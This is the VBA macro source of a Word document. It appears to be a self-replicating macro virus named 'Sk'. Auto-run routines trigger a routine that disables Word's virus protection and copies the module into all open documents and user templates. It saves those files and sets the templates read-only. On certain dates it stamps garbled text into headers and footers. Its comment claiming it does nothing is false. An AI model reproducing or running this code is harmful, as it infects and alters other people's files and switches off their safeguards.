   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Mxfile"
   Sub toolsmacro()
   Mxfiles
   End Sub
   Sub Autoexit()
   Mxfiles
   End Sub
   Sub Autoexec()
   Mxfiles
   End Sub
   Sub Autonew()
   Mxfiles
   End Sub
   Sub AutoOpen()
   Mxfiles
   End Sub
   Sub Autoclose()
   Mxfiles
   End Sub
   Sub Openshell()
   Mxfiles
   End Sub
   Sub Mxfiles()
   'this is demo for Sk virus ,it do not make any thing
   On Error Resume Next
   Options.VirusProtection = False
   ddorg = ThisDocument.FullName
   For a = 1 To Documents.Count
   If Documents.Item(a).Path <> "" Then
   dest = Documents.Item(a).FullName
   SetAttr dest, vbNormal
   Else
   dest = Documents.Item(a).Name
   End If
   If ddorg <> dest Then
   Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
   If Documents.Item(a).Path <> "" Then
   Documents.Item(a).Save
   End If
   End If
   dd = Documents.Item(a).AttachedTemplate
   dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
   dd2 = dd1 + "\" + dd
   SetAttr dd2, vbNormal
   If ddorg <> dd2 Then
   Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
   End If
   SetAttr dd2, vbReadOnly
   Next a
   Dayn = Format(Date, "dd")
   Monthn = Format(Date, "mm")
   reg = Dayn Mod Monthn
   If reg = 0 Then
   txt = "ßáäÇ äÈÇíÚ ãÈÇÑß"
    ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
     Selection.EndKey Unit:=wdLine, Extend:=wdExtend
     Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
     Selection.TypeText Text:=txt
     ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
     Selection.EndKey Unit:=wdLine, Extend:=wdExtend
     Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
     Selection.TypeText Text:=txt + "                               Sk"
     ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
   End If
   End Sub
